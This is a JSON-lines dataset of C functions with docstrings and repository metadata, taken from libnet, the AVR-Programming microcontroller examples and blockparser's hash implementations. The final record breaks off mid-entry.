{"docstring": "/*\n * Under HP-UX 10, we can ask for the ppa\n */\n", "func_signal": "static int\nget_dlpi_ppa(register int fd, register const int8_t *device, register int unit,\nregister int8_t *ebuf)", "code": "{\n    register dl_hp_ppa_ack_t *ap;\n    register dl_hp_ppa_info_t *ip;\n    register int i;\n    register uint32_t majdev;\n    dl_hp_ppa_req_t\treq;\n    struct stat statbuf;\n    bpf_u_int32 buf[MAXDLBUF];\n\n    if (stat(device, &statbuf) < 0)\n    {\n        snprintf(ebuf, LIBNET_ERRBUF_SIZE,\n                 \"stat: %s: %s\", device, strerror(errno));\n        return (-1);\n    }\n    majdev = major(statbuf.st_rdev);\n\n    memset((int8_t *)&req, 0, sizeof(req));\n    req.dl_primitive = DL_HP_PPA_REQ;\n\n    memset((int8_t *)buf, 0, sizeof(buf));\n    if (send_request(fd, (int8_t *)&req, sizeof(req), \"hpppa\", ebuf, 0) < 0 ||\n        recv_ack(fd, DL_HP_PPA_ACK_SIZE, \"hpppa\", (int8_t *)buf, ebuf) < 0)\n    {\n        return (-1);\n    }\n\n    ap = (dl_hp_ppa_ack_t *)buf;\n    ip = (dl_hp_ppa_info_t *)((uint8_t *)ap + ap->dl_offset);\n\n    for (i = 0; i < ap->dl_count; i++)\n    {\n        if (ip->dl_mjr_num == majdev && ip->dl_instance_num == unit)\n        break;\n\n        ip = (dl_hp_ppa_info_t *)((uint8_t *)ip + ip->dl_next_offset);\n    }\n\n    if (i == ap->dl_count)\n    {\n        snprintf(ebuf, LIBNET_ERRBUF_SIZE,\n                 \"can't find PPA for %s\", device);\n        return (-1);\n    }\n\n    if (ip->dl_hdw_state == HDW_DEAD)\n    {\n        snprintf(ebuf, LIBNET_ERRBUF_SIZE,\n                 \"%s: hardware state: DOWN\", device);\n        return (-1);\n    }\n    return ((int)ip->dl_ppa);\n}", "path": "libnet/src/libnet_link_dlpi.c", "commit_date": "2019-10-20 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* q is either an ip hdr, or is followed  by an ip hdr. return the offset\n * from end of packet. if there is no offset, we'll return the total size,\n * and things will break later\n */\n", "func_signal": "static int calculate_ip_offset(libnet_t* l, libnet_pblock_t* q)", "code": "{\n    int ip_offset = 0;\n    libnet_pblock_t* p = l->protocol_blocks;\n    for(; p && p != q; p = p->next) {\n\tip_offset += p->b_len;\n    }\n    assert(p == q); /* if not true, then q is not a pblock! */\n\n    for(; p; p = p->next) {\n\tip_offset += p->b_len;\n\tif(pblock_is_ip(p))\n\t    break;\n    }\n\n    return ip_offset;\n}", "path": "libnet/src/libnet_pblock.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* FIXME both ptag setting and end setting should be done in pblock new and/or pblock probe. */\n", "func_signal": "libnet_ptag_t\nlibnet_pblock_update(libnet_t *l, libnet_pblock_t *p, uint32_t h_len, uint8_t type)", "code": "{\n    p->type  =  type;\n    p->ptag  =  ++(l->ptag_state);\n    p->h_len = h_len;\n    l->pblock_end = p;              /* point end of pblock list here */\n\n    return (p->ptag);\n}", "path": "libnet/src/libnet_pblock.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "// end ISR\n", "func_signal": "void initTimer0(void)", "code": "{\n  // Timer 0 Configured for free-running PWM Audio Output\n  TCCR0A |= (1<<WGM00) | (1<<WGM01); /* fast PWM mode */\n  TCCR0A |= (1<<COM0A0) | (1<<COM0A1); /* output on PD6/OC0A */\n  TCCR0B = (1<<CS00);\t\t       /* fastest clock */\n  OCR0A = 128 ;\t\t\t       /* initialize mid-value */\n  SPEAKER_DDR |= (1<<SPEAKER);\t       /* output PD6 / OC0A */\n}", "path": "AVR-Programming/Chapter18_Using-Flash-Program-Memory/talkingVoltmeter/cornell/dpcm_2bit/speech_644_GCC.c", "commit_date": "2013-11-06 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "/* microseconds */\n", "func_signal": "uint8_t debouncePress(void)", "code": "{\n  if (bit_is_clear(BUTTON_PIN, BUTTON)) {      /* button is pressed now */\n    _delay_ms(DEBOUNCE_TIME);\n    if (bit_is_clear(BUTTON_PIN, BUTTON)) {            /* still pressed */\n      return (1);\n    }\n  }\n  return 0;\n}", "path": "AVR-Programming/Chapter06_Digital-Input/toggleButton_debounced/toggleButton_debounced.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "void POVDisplay(uint8_t oneByte)", "code": "{\n  PORTB = oneByte;\n  _delay_ms(2);\n}", "path": "AVR-Programming/Chapter03_Digital-Output/povToy/povToy.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "/* milliseconds */\n", "func_signal": "int main(void)", "code": "{\n\n  DDRB = 0b11111111;           /* Data Direction Register B:\n                                   all set up for output */\n\n  while (1) {\n    PORTB = 0b00000001;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00000010;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00000100;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00001000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00010000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00100000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b01000000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b10000000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b01000000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00100000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00010000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00001000;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00000100;\n    _delay_ms(DELAYTIME);\n    PORTB = 0b00000010;\n    _delay_ms(DELAYTIME);\n  }\n}", "path": "AVR-Programming/Chapter04_Bit-Twiddling/cylonEyes_naive/cylonEyes_naive.c", "commit_date": "2015-02-28 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// ------- Functions -------- //\n", "func_signal": "void initPinChangeInterrupt(void)", "code": "{\n  PCICR |= (1 << PCIE1);    /* enable Pin-change interrupts 1 (bank C) */\n  PCMSK1 |= (1 << PC1);   /* enable specific interrupt for our pin PC1 */\n}", "path": "AVR-Programming/Chapter08_Hardware-Interrupts/capSense/capSense.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// ----------------- LFSR Routines ---------------- //\n", "func_signal": "inline uint8_t LFSR8_step(uint8_t random)", "code": "{\n  /*\n     Takes an 8-bit number, takes one step in a () LFSR.\n     [3, 4, 5, 7] is the set of taps for 8-bits that goes through\n     the whole cycle before repeating.\n\n     If you're really serious about randomness, you'll want a different\n     algorithm.  In fact, this is a great demo of how \"predictable\"\n     the \"pseudo-random\" sequence is.\n\n     Note that this is not a very efficient way to code this up,\n     but it's meant mostly for teaching and is plenty fast\n     because the compiler does an OK job with it.\n   */\n  uint8_t tap1, tap2, tap3, tap4;\n  uint8_t newBit;\n  tap1 = 1 & (random >> 3);\n  tap2 = 1 & (random >> 4);\n  tap3 = 1 & (random >> 5);\n  tap4 = 1 & (random >> 7);\n\n  newBit = tap1 ^ tap2 ^ tap3 ^ tap4;\n  random = ((random << 1) | newBit);\n  return (random);\n}", "path": "AVR-Programming/Chapter04_Bit-Twiddling/cylonEyes_16LFSR/16LFSR.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "/* milliseconds */\n", "func_signal": "int main(void)", "code": "{\n  uint8_t i=0;\n  DDRB = 0b11111111;              /* Data Direction Register B: all on */\n\n  while (1) {\n\n    while (i < 7) {\n      PORTB = (1 << i);                    /* illuminate only i'th pin */\n      _delay_ms(DELAYTIME);                                    /* wait */\n      i = i + 1;                               /* move to the next LED */\n    }\n\n    while (i > 0) {\n      PORTB = (1 << i);                    /* illuminate only i'th pin */\n      _delay_ms(DELAYTIME);                                    /* wait */\n      i = i - 1;                           /* move to the previous LED */\n    }\n  }\n\n  return 0;\n}", "path": "AVR-Programming/Chapter03_Digital-Output/povToy_cylonEyes/cylonEyes_POV.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "static inline void initFreerunningADC(void)", "code": "{\n  ADMUX |= (1 << REFS0);                  /* reference voltage on AVCC */\n  ADCSRA |= (1 << ADPS1) | (1 << ADPS0);    /* ADC clock prescaler /8 */\n\n  ADMUX |= (1 << ADLAR);     /* left-adjust result, return only 8 bits */\n\n  ADCSRA |= (1 << ADEN);                                 /* enable ADC */\n  ADCSRA |= (1 << ADATE);                       /* auto-trigger enable */\n  ADCSRA |= (1 << ADSC);                     /* start first conversion */\n}", "path": "AVR-Programming/Chapter07_Analog-to-Digital-Conversion-I/slowScope/slowScope.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// From f = f_cpu / ( 2* N* (1 + OCRnx) )\n// Good values for the AM band from 2 to 6: pick one that's clear\n// Divide by two b/c we're toggling on or off each loop;\n//  a full cycle of the carrier takes two loops.\n// 8Mhz / (2 * 1 * (1+2)) = 1333 kHz\n// 8Mhz / (2 * 1 * (1+3)) = 1000 kHz\n// 8Mhz / (2 * 1 * (1+4)) = 800 kHz\n// 8Mhz / (2 * 1 * (1+5)) = 670 kHz\n// 8Mhz / (2 * 1 * (1+6)) = 570 kHz\n// 8Mhz / (2 * 1 * (1+7)) = 500 kHz\n", "func_signal": "static inline void initTimer0(void)", "code": "{\n  TCCR0A |= (1 << WGM01);                                  /* CTC mode */\n  TCCR0A |= (1 << COM0B0);            /* Toggles pin each time through */\n  TCCR0B |= (1 << CS00);              /* Clock at CPU frequency, ~8MHz */\n  OCR0A = COUNTER_VALUE;                          /* carrier frequency */\n}", "path": "AVR-Programming/Chapter09_Introduction-to-Timer-Counter-Hardware/amRadio/amRadio.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "/* determines long note length */\n", "func_signal": "int main(void)", "code": "{\n\n  // -------- Inits --------- //\n  SPEAKER_DDR |= (1 << SPEAKER);                 /* speaker for output */\n  initUSART();\n  printString(\"----- Serial Organ ------\\r\\n\");\n\n  char fromCompy;                        /* used to store serial input */\n  uint16_t currentNoteLength = NOTE_DURATION / 2;\n  const uint8_t keys[] = { 'a', 'w', 's', 'e', 'd', 'f', 't',\n    'g', 'y', 'h', 'j', 'i', 'k', 'o',\n    'l', 'p', ';', '\\''\n  };\n  const uint16_t notes[] = { G4, Gx4, A4, Ax4, B4, C5, Cx5,\n    D5, Dx5, E5, F5, Fx5, G5, Gx5,\n    A5, Ax5, B5, C6\n  };\n  uint8_t isNote;\n  uint8_t i;\n\n  // ------ Event loop ------ //\n  while (1) {\n\n                                                            /* Get Key */\n    fromCompy = receiveByte();      /* waits here until there is input */\n    transmitByte('N');     /* alert computer we're ready for next note */\n\n                                                         /* Play Notes */\n    isNote = 0;\n    for (i = 0; i < sizeof(keys); i++) {\n      if (fromCompy == keys[i]) {       /* found match in lookup table */\n        playNote(notes[i], currentNoteLength);\n        isNote = 1;                  /* record that we've found a note */\n        break;                               /* drop out of for() loop */\n      }\n    }\n\n                      /* Handle non-note keys: tempo changes and rests */\n    if (!isNote) {\n      if (fromCompy == '[') {                   /* code for short note */\n        currentNoteLength = NOTE_DURATION / 2;\n      }\n      else if (fromCompy == ']') {               /* code for long note */\n        currentNoteLength = NOTE_DURATION;\n      }\n      else {                                /* unrecognized, just rest */\n        rest(currentNoteLength);\n      }\n    }\n\n  }                                                  /* End event loop */\n  return 0;\n}", "path": "AVR-Programming/Chapter05_Serial-IO/serialOrgan/serialOrgan.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "void printFromEEPROM(char *eepromString)", "code": "{\n  uint8_t letter;\n  do {\n    letter = eeprom_read_byte((uint8_t *) eepromString);\n    transmitByte(letter);\n    eepromString++;\n  } while (letter);\n}", "path": "AVR-Programming/Chapter19_EEPROM/vigenereCipher/vigenereCipher.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "static inline void initTimer0(void)", "code": "{\n  TCCR0A |= (1 << WGM00);                             /* Fast PWM mode */\n  TCCR0A |= (1 << WGM01);                       /* Fast PWM mode, pt.2 */\n  TCCR0A |= (1 << COM0B1);                        /* output PWM to pin */\n  TCCR0B |= (1 << CS02);                 /* Clock with /1024 prescaler */\n  //TCCR0B |= (1 << CS00);         /* Clock with /1024 prescaler, pt.2 */\n}", "path": "AVR-Programming/Chapter14_Switches/dcMotorWorkout/dcMotorWorkout.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "/* 8-bit scale */\n", "func_signal": "static inline void initTimer(void)", "code": "{\n  TCCR0A |= (1 << WGM01);                                  /* CTC mode */\n  TCCR0A |= (1 << COM0A0);           /* Toggles pin each cycle through */\n  TCCR0B |= (1 << CS00) | (1 << CS01);               /* CPU clock / 64 */\n}", "path": "AVR-Programming/Chapter09_Introduction-to-Timer-Counter-Hardware/timerAudio/timerAudio.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "static inline void initADC0(void)", "code": "{\n  ADMUX |= (1 << REFS0);                  /* reference voltage on AVCC */\n  ADCSRA |= (1 << ADPS2);                   /* ADC clock prescaler /16 */\n  ADCSRA |= (1 << ADEN);                                 /* enable ADC */\n}", "path": "AVR-Programming/Chapter07_Analog-to-Digital-Conversion-I/lightSensor/lightSensor.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "/* Here are a bunch of useful printing commands */\n", "func_signal": "void printString(const char myString[])", "code": "{\n  uint8_t i = 0;\n  while (myString[i]) {\n    transmitByte(myString[i]);\n    i++;\n  }\n}", "path": "AVR-Programming/setupProject/USART.c", "commit_date": "2014-01-27 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "/* Defines, includes, and init functions */\n", "func_signal": "int main(void)", "code": "{\n\n  // -------- Inits --------- //\n\n  uint16_t accumulator = 0;\n  uint8_t volume = 0;\n  uint16_t noteClock = 0;\n  uint16_t tuningWord = C1;\n\n  uint8_t waveStep;\n  int16_t mixer=0;\n  char serialInput;\n\n  clock_prescale_set(clock_div_1);                  /* CPU clock 8 MHz */\n  initTimer0();\n  initUSART();\n  printString(\"  Serial Synth\\r\\n\");\n  printString(\"Notes: asdfghjkl;'\\r\\n\");\n\n  SPEAKER_DDR |= (1 << SPEAKER);                     /* speaker output */\n\n  // ------ Event loop ------ //\n  while (1) {\n\n    // Set PWM output\n    loop_until_bit_is_set(TIFR0, TOV0);    /* wait for timer0 overflow */\n    OCR0A = 128 + (uint8_t) mixer;\n    TIFR0 |= (1 << TOV0);                    /* reset the overflow bit */\n\n    // Update the DDS\n    accumulator += tuningWord;\n    waveStep = accumulator >> 8;\n    mixer = fullTriangle[waveStep] * volume;\n    mixer = mixer >> 5;\n\n                                  /* Input processed here: check USART */\n    if (bit_is_set(UCSR0A, RXC0)) {\n      serialInput = UDR0;                        /* read in from USART */\n      tuningWord = lookupPitch(serialInput);\n      noteClock = 1;\n    }\n\n                                          /* Dynamic Volume stuff here */\n    if (noteClock) {                   /* if noteClock already running */\n      noteClock++;\n      if (noteClock < ATTACK_TIME) {                         /* attack */\n                              /* wait until time to increase next step */\n        if (noteClock > ATTACK_RATE * volume) {\n          if (volume < 31) {\n            volume++;\n          }\n        }\n      }\n      else if (noteClock < DECAY_TIME) {                      /* decay */\n        if ((noteClock - ATTACK_TIME) >\n            (FULL_VOLUME - volume) * DECAY_RATE) {\n          if (volume > SUSTAIN_LEVEL) {\n            volume--;\n          }\n        }\n      }\n      else if (noteClock > RELEASE_TIME) {                  /* release */\n        if ((noteClock - RELEASE_TIME) >\n            (SUSTAIN_LEVEL - volume) * RELEASE_RATE) {\n          if (volume > 0) {\n            volume--;\n          }\n          else {\n            noteClock = 0;\n          }\n        }\n      }\n    }\n\n\n  }                                                  /* End event loop */\n  return 0;                            /* This line is never reached */\n}", "path": "AVR-Programming/Chapter13_Advanced-PWM-Tricks/adsr/adsr.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "static inline void initTimer0(void)", "code": "{\n                                 /* must be /64 or more for ISR timing */\n  TCCR0B |= (1 << CS01) | (1 << CS00);\n                                     /* both output compare interrupts */\n  TIMSK0 |= ((1 << OCIE0A) | (1 << OCIE1B));\n  TIMSK0 |= (1 << TOIE0);                 /* overflow interrupt enable */\n  sei();\n}", "path": "AVR-Programming/Chapter10_Pulse-Width-Modulation/pwmOnAnyPin/pwmOnAnyPin.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "int main(void)", "code": "{\n\n  uint8_t tempHighByte, tempLowByte;\n\n  // -------- Inits --------- //\n  clock_prescale_set(clock_div_1);                             /* 8MHz */\n  initUSART();\n  printString(\"\\r\\n====  i2c Thermometer  ====\\r\\n\");\n  initI2C();\n\n  // ------ Event loop ------ //\n  while (1) {\n                        /* To set register, address LM75 in write mode */\n    i2cStart();\n    i2cSend(LM75_ADDRESS_W);\n    i2cSend(LM75_TEMP_REGISTER);\n    i2cStart();                      /* restart, just send start again */\n                              /* Setup and send address, with read bit */\n    i2cSend(LM75_ADDRESS_R);\n                               /* Now receive two bytes of temperature */\n    tempHighByte = i2cReadAck();\n    tempLowByte = i2cReadNoAck();\n    i2cStop();\n\n    // Print it out nicely over serial for now...\n    printByte(tempHighByte);\n    if (tempLowByte & _BV(7)) {\n      printString(\".5\\r\\n\");\n    }\n    else {\n      printString(\".0\\r\\n\");\n    }\n\n                                                    /* Once per second */\n    _delay_ms(1000);\n\n  }                                                  /* End event loop */\n  return 0;                            /* This line is never reached */\n}", "path": "AVR-Programming/Chapter17_I2C/i2cThermometer/i2cThermometer.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "static inline void printTemperature(uint8_t tempReading)", "code": "{\n                                   /* temperature stored as 2x Celcius */\n  printByte((tempReading >> 1));\n  if (tempReading & 1) {\n    printString(\".5\\r\\n\");\n  }\n  else {\n    printString(\".0\\r\\n\");\n  }\n}", "path": "AVR-Programming/Chapter17_I2C/loggingThermometer/loggingThermometer.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "// -------- Functions --------- //\n", "func_signal": "void initTimer(void)", "code": "{\n  TCCR0A |= (1 << WGM01);                                  /* CTC mode */\n  TCCR0B |= (1 << CS00) | (1 << CS02);\n  OCR0A = MAX_DELAY;                   /* set default speed as slowest */\n  sei();                                   /* enable global interrupts */\n               /* Notice we haven't set the timer0 interrupt flag yet. */\n}", "path": "AVR-Programming/Chapter15_Advanced-Motors/stepperWorkout/stepperWorkout.c", "commit_date": "2016-05-20 00:00:00", "repo_name": "hexagon5un/AVR-Programming", "stars": 712, "license": "mit", "language": "c", "size": 2789}
{"docstring": "/* see sph_bmw.h */\n", "func_signal": "void\nsph_bmw384_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tbmw64_close(cc, ub, n, dst, 6);\n\tsph_bmw384_init(cc);\n}", "path": "blockparser/h9/bmw.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_bmw.h */\n", "func_signal": "void\nsph_bmw224_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tbmw32_close(cc, ub, n, dst, 7);\n\tsph_bmw224_init(cc);\n}", "path": "blockparser/h9/bmw.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_shavite.h */\n", "func_signal": "void\nsph_shavite256_close(void *cc, void *dst)", "code": "{\n\tshavite_small_close(cc, 0, 0, dst, 8);\n\tshavite_small_init(cc, IV256);\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_shavite.h */\n", "func_signal": "void\nsph_shavite384_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tshavite_big_close(cc, ub, n, dst, 12);\n\tshavite_big_init(cc, IV384);\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_blake.h */\n", "func_signal": "void\nsph_blake224_addbits_and_close(void *cc, unsigned ub, unsigned n, void *dst)", "code": "{\n\tblake32_close(cc, ub, n, dst, 7);\n\tsph_blake224_init(cc);\n}", "path": "blockparser/h9/blake.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/* see sph_shavite.h */\n", "func_signal": "void\nsph_shavite384_close(void *cc, void *dst)", "code": "{\n\tshavite_big_close(cc, 0, 0, dst, 12);\n\tshavite_big_init(cc, IV384);\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": "None", "language": "c", "size": 1036}
{"docstring": "/*\n * This function assumes that \"msg\" is aligned for 32-bit access.\n */\n", "func_signal": "static void\nc512(sph_shavite_big_context *sc, const void *msg)", "code": "{\n\tsph_u32 p0, p1, p2, p3, p4, p5, p6, p7;\n\tsph_u32 p8, p9, pA, pB, pC, pD, pE, pF;\n\tsph_u32 rk[448];\n\tsize_t u;\n\tint r, s;\n\n#if SPH_LITTLE_ENDIAN\n\tmemcpy(rk, msg, 128);\n#else\n\tfor (u = 0; u < 32; u += 4) {\n\t\trk[u + 0] = sph_dec32le_aligned(\n\t\t\t(const unsigned char *)msg + (u << 2) +  0);\n\t\trk[u + 1] = sph_dec32le_aligned(\n\t\t\t(const unsigned char *)msg + (u << 2) +  4);\n\t\trk[u + 2] = sph_dec32le_aligned(\n\t\t\t(const unsigned char *)msg + (u << 2) +  8);\n\t\trk[u + 3] = sph_dec32le_aligned(\n\t\t\t(const unsigned char *)msg + (u << 2) + 12);\n\t}\n#endif\n\tu = 32;\n\tfor (;;) {\n\t\tfor (s = 0; s < 4; s ++) {\n\t\t\tsph_u32 x0, x1, x2, x3;\n\n\t\t\tx0 = rk[u - 31];\n\t\t\tx1 = rk[u - 30];\n\t\t\tx2 = rk[u - 29];\n\t\t\tx3 = rk[u - 32];\n\t\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\t\trk[u + 0] = x0 ^ rk[u - 4];\n\t\t\trk[u + 1] = x1 ^ rk[u - 3];\n\t\t\trk[u + 2] = x2 ^ rk[u - 2];\n\t\t\trk[u + 3] = x3 ^ rk[u - 1];\n\t\t\tif (u == 32) {\n\t\t\t\trk[ 32] ^= sc->count0;\n\t\t\t\trk[ 33] ^= sc->count1;\n\t\t\t\trk[ 34] ^= sc->count2;\n\t\t\t\trk[ 35] ^= SPH_T32(~sc->count3);\n\t\t\t} else if (u == 440) {\n\t\t\t\trk[440] ^= sc->count1;\n\t\t\t\trk[441] ^= sc->count0;\n\t\t\t\trk[442] ^= sc->count3;\n\t\t\t\trk[443] ^= SPH_T32(~sc->count2);\n\t\t\t}\n\t\t\tu += 4;\n\n\t\t\tx0 = rk[u - 31];\n\t\t\tx1 = rk[u - 30];\n\t\t\tx2 = rk[u - 29];\n\t\t\tx3 = rk[u - 32];\n\t\t\tAES_ROUND_NOKEY(x0, x1, x2, x3);\n\t\t\trk[u + 0] = x0 ^ rk[u - 4];\n\t\t\trk[u + 1] = x1 ^ rk[u - 3];\n\t\t\trk[u + 2] = x2 ^ rk[u - 2];\n\t\t\trk[u + 3] = x3 ^ rk[u - 1];\n\t\t\tif (u == 164) {\n\t\t\t\trk[164] ^= sc->count3;\n\t\t\t\trk[165] ^= sc->count2;\n\t\t\t\trk[166] ^= sc->count1;\n\t\t\t\trk[167] ^= SPH_T32(~sc->count0);\n\t\t\t} else if (u == 316) {\n\t\t\t\trk[316] ^= sc->count2;\n\t\t\t\trk[317] ^= sc->count3;\n\t\t\t\trk[318] ^= sc->count0;\n\t\t\t\trk[319] ^= SPH_T32(~sc->count1);\n\t\t\t}\n\t\t\tu += 4;\n\t\t}\n\t\tif (u == 448)\n\t\t\tbreak;\n\t\tfor (s = 0; s < 8; s ++) {\n\t\t\trk[u + 0] = rk[u - 32] ^ rk[u - 7];\n\t\t\trk[u + 1] = rk[u - 31] ^ rk[u - 6];\n\t\t\trk[u + 2] = rk[u - 30] ^ rk[u - 5];\n\t\t\trk[u + 3] = rk[u - 29] ^ rk[u - 4];\n\t\t\tu += 4;\n\t\t}\n\t}\n\n\tp0 = sc->h[0x0];\n\tp1 = sc->h[0x1];\n\tp2 = sc->h[0x2];\n\tp3 = sc->h[0x3];\n\tp4 = sc->h[0x4];\n\tp5 = sc->h[0x5];\n\tp6 = sc->h[0x6];\n\tp7 = sc->h[0x7];\n\tp8 = sc->h[0x8];\n\tp9 = sc->h[0x9];\n\tpA = sc->h[0xA];\n\tpB = sc->h[0xB];\n\tpC = sc->h[0xC];\n\tpD = sc->h[0xD];\n\tpE = sc->h[0xE];\n\tpF = sc->h[0xF];\n\tu = 0;\n\tfor (r = 0; r < 14; r ++) {\n#define C512_ELT(l0, l1, l2, l3, r0, r1, r2, r3)   do { \\\n\t\tsph_u32 x0, x1, x2, x3; \\\n\t\tx0 = r0 ^ rk[u ++]; \\\n\t\tx1 = r1 ^ rk[u ++]; \\\n\t\tx2 = r2 ^ rk[u ++]; \\\n\t\tx3 = r3 ^ rk[u ++]; \\\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3); \\\n\t\tx0 ^= rk[u ++]; \\\n\t\tx1 ^= rk[u ++]; \\\n\t\tx2 ^= rk[u ++]; \\\n\t\tx3 ^= rk[u ++]; \\\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3); \\\n\t\tx0 ^= rk[u ++]; \\\n\t\tx1 ^= rk[u ++]; \\\n\t\tx2 ^= rk[u ++]; \\\n\t\tx3 ^= rk[u ++]; \\\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3); \\\n\t\tx0 ^= rk[u ++]; \\\n\t\tx1 ^= rk[u ++]; \\\n\t\tx2 ^= rk[u ++]; \\\n\t\tx3 ^= rk[u ++]; \\\n\t\tAES_ROUND_NOKEY(x0, x1, x2, x3); \\\n\t\tl0 ^= x0; \\\n\t\tl1 ^= x1; \\\n\t\tl2 ^= x2; \\\n\t\tl3 ^= x3; \\\n\t} while (0)\n\n#define WROT(a, b, c, d)   do { \\\n\t\tsph_u32 t = d; \\\n\t\td = c; \\\n\t\tc = b; \\\n\t\tb = a; \\\n\t\ta = t; \\\n\t} while (0)\n\n\t\tC512_ELT(p0, p1, p2, p3, p4, p5, p6, p7);\n\t\tC512_ELT(p8, p9, pA, pB, pC, pD, pE, pF);\n\n\t\tWROT(p0, p4, p8, pC);\n\t\tWROT(p1, p5, p9, pD);\n\t\tWROT(p2, p6, pA, pE);\n\t\tWROT(p3, p7, pB, pF);\n\n#undef C512_ELT\n#undef WROT\n\t}\n\tsc->h[0x0] ^= p0;\n\tsc->h[0x1] ^= p1;\n\tsc->h[0x2] ^= p2;\n\tsc->h[0x3] ^= p3;\n\tsc->h[0x4] ^= p4;\n\tsc->h[0x5] ^= p5;\n\tsc->h[0x6] ^= p6;\n\tsc->h[0x7] ^= p7;\n\tsc->h[0x8] ^= p8;\n\tsc->h[0x9] ^= p9;\n\tsc->h[0xA] ^= pA;\n\tsc->h[0xB] ^= pB;\n\tsc->h[0xC] ^= pC;\n\tsc->h[0xD] ^= pD;\n\tsc->h[0xE] ^= pE;\n\tsc->h[0xF] ^= pF;\n}", "path": "blockparser/h9/shavite.c", "commit_date": "2014-08-20 00:00:00", "repo_name": "znort987/blockparser", "stars": 529, "license": 